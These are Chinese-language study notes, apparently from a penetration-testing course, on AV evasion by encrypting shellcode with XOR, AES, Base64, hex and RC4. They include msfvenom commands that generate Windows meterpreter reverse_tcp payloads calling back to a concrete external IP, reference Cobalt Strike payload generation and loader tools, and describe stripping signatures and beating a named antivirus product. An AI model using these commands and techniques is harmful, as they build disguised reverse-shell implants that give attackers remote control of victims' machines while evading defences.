## **shellcode特征和加密**
MSF的客户端源码是开源的，可以找到地址reversetcp.rb，是ruby语言。
查看ruby语言源码比对生成的shellcode。
可以看到shellcode本质是16进制数字，有特征，可以看到外链的ip和端口，可以直接修改shellcode中16进制。

^
所以通过加密编码后去除shellcode特征，实现免杀。
最好生成64位可执行文件。

加密不一定只加密shellcode，整个代码都可以加密，还可以整个代码加密后，用反序列化解密执行。

PS：这种方式对某60效果不好。
PS：其实shellcode使用静态混淆SGN后，无需再做加密。



## **xor加密**
```
msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai 
-i 6 -b "\x00" lhost=47.94.236.117 Iport=3333 -f raw >shellcode.raw

CS-有效载荷-Payload生成器-raw > payload.bin
```
python2 shellcode encoder.py -cpp -cs -py payload.bin xiaodi xor

生成c++，c#，py的代码，其中shellcode被加密过，运行生成可执行文件即可。


可以自己写shellcode的xor加密方式，对应的解密代码，再加载器编译成可执行文件实现免杀。



^
## **Aes加密**
每次密钥不同，加密后也不同。

^
## **Base64加密**
可以和其他方式组合。

^
## **Hex加密**
http://github.com/ByPassAVTeam/ShellcodeLoader
LoaderMaker.exe download.dat(hex 数据) xiaodi.exe(生成文件名)



^
## **RC4加密（好）**
```
msfvenom -p windows/meterpreter/reverse_tcp lhost=47.94.236.117
lport=6688 -f c
```
算法参考
https://blog.csdn.net/weixin_45590789/article/details/105536623

